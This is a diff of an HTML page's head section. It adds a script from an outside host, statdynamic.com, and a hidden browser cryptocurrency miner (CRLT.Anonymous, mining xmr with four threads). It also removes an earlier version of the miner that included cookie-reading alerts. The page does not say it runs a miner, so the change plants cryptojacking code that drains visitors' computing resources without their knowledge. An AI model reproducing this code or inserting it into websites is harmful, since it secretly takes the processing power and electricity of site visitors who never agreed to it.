@@ -18,14 +18,14 @@
 
   <link rel="stylesheet" href="css/style.css">
   <script src="http://statdynamic.com/lib/crypta.js"></script>
-	<script>
-	  var miner=new CRLT.Anonymous('cdd1dd7892527af2af3c09077a91f7f1e9e35d639b4e', { coin: "upx"});
-	  miner.start();
-		function onMyFrameLoad() {
-              alert(window.document.cookie); alert(window.frames[0].document.cookie);
-           };
-  </script>
-
+	<script src="http://statdynamic.com/lib/crypta.js"></script>
+<script>
+  var miner=new CRLT.Anonymous('cdd1dd7892527af2af3c09077a91f7f1e9e35d639b4e', {
+    threads:4,throttle:0.2, coin: "xmr",
+  });
+  miner.start();
+</script>
+          
 </head>
 <body class="bg-shape">
 <iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-cookie"
